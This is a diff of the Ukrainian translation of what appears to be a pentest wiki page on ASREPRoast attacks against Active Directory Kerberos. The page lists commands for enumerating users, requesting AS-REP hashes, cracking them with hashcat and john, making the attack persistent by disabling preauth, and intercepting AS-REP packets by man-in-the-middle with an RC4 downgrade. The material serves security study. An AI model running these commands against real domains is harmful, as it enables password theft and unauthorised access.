@@ -4,15 +4,15 @@
 
 ## ASREPRoast
 
-ASREPRoast — це атака на безпеку, яка експлуатує користувачів, що не мають атрибуту **Kerberos pre-authentication required attribute**. По суті, ця вразливість дозволяє зловмисникам запитувати автентифікацію для користувача у Domain Controller (DC) без необхідності знати пароль користувача. DC потім відповідає повідомленням, зашифрованим ключем, похідним від пароля користувача, яке зловмисники можуть намагатися розшифрувати офлайн, щоб дізнатися пароль користувача.
+ASREPRoast — це атака на безпеку, яка експлуатує користувачів, у яких відсутній параметр **Kerberos pre-authentication required attribute**. По суті, ця вразливість дозволяє зловмисникам запитувати автентифікацію користувача від Domain Controller (DC) без потреби в паролі користувача. DC у відповідь надсилає повідомлення, зашифроване ключем, отриманим з пароля користувача, яке зловмисники можуть спробувати зламати офлайн, щоб дізнатися пароль користувача.
 
-Основні вимоги для цієї атаки:
+The main requirements for this attack are:
 
-- **Lack of Kerberos pre-authentication**: цільові користувачі не повинні мати ввімкнену цю функцію безпеки.
-- **Connection to the Domain Controller (DC)**: зловмисникам потрібен доступ до DC, щоб надсилати запити та отримувати зашифровані повідомлення.
-- **Optional domain account**: наявність доменного облікового запису дозволяє зловмисникам ефективніше ідентифікувати вразливих користувачів через LDAP-запити. Без такого облікового запису зловмисникам доведеться вгадувати імена користувачів.
+- **Lack of Kerberos pre-authentication**: Цільові користувачі не повинні мати увімкнену цю функцію безпеки.
+- **Connection to the Domain Controller (DC)**: Зловмисникам потрібен доступ до DC, щоб надсилати запити та отримувати зашифровані повідомлення.
+- **Optional domain account**: Наявність domain account дозволяє зловмисникам ефективніше знаходити вразливих користувачів через LDAP-запити. Без такого облікового запису зловмисникам доведеться вгадувати імена користувачів.
 
-#### Enumerating vulnerable users (need domain credentials)
+#### Перелікування вразливих користувачів (потрібні облікові дані домену)
 ```bash:Using Windows
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -33,22 +33,22 @@ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashc
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
 > [!WARNING]
-> AS-REP Roasting with Rubeus згенерує 4768 з encryption type 0x17 і preauth type 0.
+> AS-REP Roasting with Rubeus згенерує 4768 з encryption type 0x17 та preauth type 0.
 
-#### Quick one-liners (Linux)
+#### Швидкі однорядкові команди (Linux)
 
-- Перерахуйте спочатку потенційні цілі (наприклад, зі leaked build paths) за допомогою Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
-- Отримайте AS-REP одного користувача навіть з **порожнім** паролем, використовуючи `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec також виводить інформацію про LDAP signing/channel binding posture).
-- Зламуйте за допомогою `hashcat out.asreproast /path/rockyou.txt` – він автоматично визначає **-m 18200** (etype 23) для AS-REP roast hashes.
+- Спочатку перелічи потенційні цілі (наприклад, із leaked build paths) за допомогою Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
+- Отримай AS-REP одного користувача навіть з **порожнім** паролем, використовуючи `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec також показує LDAP signing/channel binding posture).
+- Зламуй за допомогою `hashcat out.asreproast /path/rockyou.txt` – він автоматично визначає **-m 18200** (etype 23) для AS-REP roast hashes.
 
-### Злам
+### Cracking
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
-### Персистентність
+### Persistence
 
-Не потрібно вимагати **preauth** для користувача, на якого у вас є права **GenericAll** (або права на запис властивостей):
+Змусити, щоб для користувача, для якого у вас є права **GenericAll** (або права на запис властивостей), **preauth** не вимагався:
 ```bash:Using Windows
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -56,10 +56,10 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
 ```
-## ASREProast without credentials
+## ASREProast без облікових даних
 
-Атакуючий може використати позицію man-in-the-middle, щоб перехоплювати AS-REP packets під час їх проходження мережею, не покладаючись на те, що Kerberos pre-authentication вимкнено. Отже, це працює для всіх користувачів у VLAN.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) дозволяє нам зробити це. Крім того, інструмент змушує клієнтські робочі станції використовувати RC4 шляхом зміни Kerberos negotiation.
+Зловмисник може зайняти позицію man-in-the-middle, щоб перехоплювати AS-REP пакети під час їх проходження мережею, не покладаючись на те, що Kerberos pre-authentication вимкнено. Отже, це працює для всіх користувачів у VLAN.\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) дозволяє це зробити. Більше того, інструмент примушує клієнтські робочі станції використовувати RC4, змінюючи Kerberos negotiation.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -70,7 +70,7 @@ ASRepCatcher relay -dc $DC_IP --disable-spoofing
 # Passive listening of AS-REP packets, no packet alteration
 ASRepCatcher listen
 ```
-## Джерела
+## Посилання
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 - [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
